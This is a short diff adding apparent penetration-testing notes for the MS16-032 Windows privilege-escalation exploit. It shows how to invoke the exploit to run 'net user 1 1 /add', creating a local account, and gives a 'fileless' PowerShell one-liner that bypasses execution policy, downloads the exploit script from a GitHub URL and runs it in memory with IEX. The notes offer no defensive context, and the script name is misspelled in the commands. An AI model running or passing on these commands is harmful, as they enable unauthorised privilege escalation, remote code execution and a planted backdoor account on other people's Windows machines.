@@ -1,0 +1,5 @@
+use MS16-032
+Invok-MS16-032.ps1 -Application cmd.exe -Commandline "/c net user 1 1 /add"
+Invok-MS16-032.ps1 -Application notepad.exe //
+#fileless type;
+powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1');Invok-MS16-032.ps1 -Application cmd.exe -commandline '/c net user 1 1 /add'"
